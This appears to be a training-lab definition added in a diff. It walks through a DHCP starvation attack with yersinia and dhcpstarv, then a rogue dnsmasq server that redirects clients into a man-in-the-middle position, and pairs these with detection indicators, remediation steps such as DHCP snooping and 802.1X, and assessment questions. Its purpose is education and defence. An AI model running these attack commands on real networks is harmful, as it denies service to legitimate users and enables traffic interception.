@@ -1,0 +1,100 @@
+# Category: Network Security - DHCP
+name: "DHCP Starvation and Rogue DHCP Server"
+id: "network-dhcp-starvation-001"
+category: "network_security"
+subcategory: "dhcp"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Launch a DHCP starvation attack by flooding the network with DHCP requests
+  with spoofed MAC addresses, exhausting the DHCP server's IP pool. Then set
+  up a rogue DHCP server to offer malicious IP configurations (wrong gateway,
+  DNS) to redirect traffic.
+
+learning_objectives:
+  - Understand DHCP lease process
+  - Use tools like `dhcpstarv` or `yersinia` to exhaust pool
+  - Deploy a rogue DHCP server using `dnsmasq`
+  - Intercept and modify network traffic
+
+tools:
+  - yersinia
+  - dhcpstarv (Kali)
+  - dnsmasq
+  - scapy
+  - tcpdump
+
+prerequisites:
+  - Local network access
+  - Ability to send raw packets
+
+steps:
+  - id: "step1"
+    phase: "starvation"
+    action: "Flood DHCP server with spoofed MACs"
+    commands:
+      - "# Using yersinia"
+      - "yersinia dhcp -attack 1"
+      - "# Or dhcpstarv"
+      - "dhcpstarv -v eth0"
+    expected_output: "DHCP pool exhausted; legitimate clients can't get IPs"
+    detection: "DHCP server logs show high lease requests"
+
+  - id: "step2"
+    phase: "rogue"
+    action: "Set up rogue DHCP server"
+    commands:
+      - "# Using dnsmasq"
+      - "dnsmasq --interface=eth0 --dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0 --dhcp-option=3,192.168.1.1 --dhcp-option=6,8.8.8.8"
+      - "# Also set DHCP-option for DNS to attacker"
+    expected_output: "Clients get IP from rogue server"
+    detection: "Network IDS may detect rogue DHCP offers"
+
+  - id: "step3"
+    phase: "mitm"
+    action: "Redirect traffic through attacker"
+    commands:
+      - "# Enable IP forwarding and intercept"
+    expected_output: "Man-in-the-middle position"
+    detection: "Traffic analysis may show anomalies"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1557"
+    description: "Adversary-in-the-Middle"
+  - standard: "NIST SP 800-53"
+    control: "SC-7"
+    description: "Boundary Protection"
+
+detection:
+  network_indicators:
+    - "High rate of DHCP Discover messages"
+    - "Multiple DHCP Offers from different IPs"
+  log_indicators:
+    - "DHCP server logs"
+  endpoint_indicators:
+    - "yersinia, dnsmasq"
+
+remediation:
+  immediate:
+    - "Enable DHCP snooping on switches (port trust)"
+    - "Use static ARP and IP assignments"
+  long_term:
+    - "Implement 802.1X on network access"
+    - "Monitor for rogue DHCP servers"
+
+variables:
+  interface: "eth0"
+  subnet: "192.168.1.0/24"
+
+assessment_questions:
+  - "How does DHCP starvation exhaust the pool?"
+  - "What is DHCP snooping and how does it prevent rogue servers?"
+  - "Why would an attacker want to poison DNS via DHCP?"
+
+references:
+  - url: "https://www.cisco.com/c/en/us/support/docs/security/dhcp-snooping/116045-technote-dhcp-00.html"
+    title: "Cisco DHCP Snooping"
+  - url: "https://tools.kali.org/information-gathering/yersinia"
+    title: "Yersinia Tool"
